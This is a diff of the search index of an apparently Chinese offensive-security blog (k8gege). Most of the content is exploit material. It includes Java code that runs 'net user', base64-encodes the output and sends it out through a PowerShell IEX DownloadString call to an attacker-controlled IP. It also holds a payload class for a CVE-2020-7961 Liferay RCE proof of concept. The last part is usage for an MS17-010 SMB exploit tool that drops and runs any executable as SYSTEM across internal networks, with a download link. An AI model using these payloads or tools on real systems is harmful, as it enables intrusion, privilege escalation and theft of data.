@@ -1191,7 +1191,8 @@ System.out.println(encodeStr);</code></pre><p><img alt="image" data-original="ht
 <h3 id="完美回显"><a href="#完美回显" class="headerlink" title="完美回显"></a>完美回显</h3><p>由于是BASE64加密提交的，所以什么符号都可以，这样我们可以把换行加上去,得到完美回显<br>其它漏洞回显解决方案同理，包括不仅限于WEB漏洞，本文只是用JAVA的反序列漏洞做例子</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//main.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.util.Base64.Encoder;</span><br><span class="line">import java.util.Base64;//jdk 1.8</span><br><span class="line">public class main</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        try &#123;</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(<span class="string">"net user"</span>).getInputStream()));</span><br><span class="line">            String line=null;</span><br><span class="line">            StringBuffer b=new StringBuffer();</span><br><span class="line">            <span class="keyword">while</span> ((line=br.readLine())!=null) &#123;</span><br><span class="line">                b.append(line+<span class="string">"\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(b.toString());</span><br><span class="line">            </span><br><span class="line">        Encoder encoder = Base64.getEncoder();</span><br><span class="line">        byte[] encode = encoder.encode(b.toString().getBytes());</span><br><span class="line">        String encodeStr = new String(encode);</span><br><span class="line">        System.out.println(encodeStr);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">String[] cmd = &#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.126:9001/debase64/"</span>+encodeStr,<span class="string">"')"</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            //java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd).waitFor();</span><br><span class="line">            java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>将以上代码稍微修改一下集成到POC里，如CVE-2020-7961 RCE漏洞，编译成class</p>
+<p>将以上代码稍微修改一下集成到以下POC里，如CVE-2020-7961 RCE漏洞，编译成class</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//LifExp.java</span><br><span class="line">public class LifExp &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"calc.exe"</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().</span><br><span class="line"><span class="built_in">exec</span>(cmd).waitFor();</span><br><span class="line">        &#125; catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img alt="image" data-original="http://k8gege.org/k8img/posts/webjavarcestr/ipconfig.PNG"></p>
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><h4 id="LadonGo-ALL-OS"><a href="#LadonGo-ALL-OS" class="headerlink" title="LadonGo (ALL OS)"></a>LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo/releases</a></p>
 <h4 id="Ladon-Windows-amp-Cobalt-Strike"><a href="#Ladon-Windows-amp-Cobalt-Strike" class="headerlink" title="Ladon (Windows &amp; Cobalt Strike)"></a>Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.0版本：K8小密圈</p>
@@ -2931,8 +2932,8 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
         <category>.NET</category>
         <category>主机发现</category>
         <category>源码</category>
-        <category>信息收集</category>
         <category>内网渗透</category>
+        <category>信息收集</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -3470,8 +3471,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>主机发现</category>
-        <category>信息收集</category>
         <category>内网渗透</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -4867,8 +4868,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
         <category>Ladon</category>
         <category>源码</category>
-        <category>Python</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -5031,6 +5032,33 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -5127,33 +5155,6 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -5502,10 +5503,10 @@ from pprint import pprint
         <category>主机发现</category>
         <category>源码</category>
         <category>嗅探</category>
-        <category>信息收集</category>
         <category>内网渗透</category>
-        <category>Python</category>
+        <category>信息收集</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
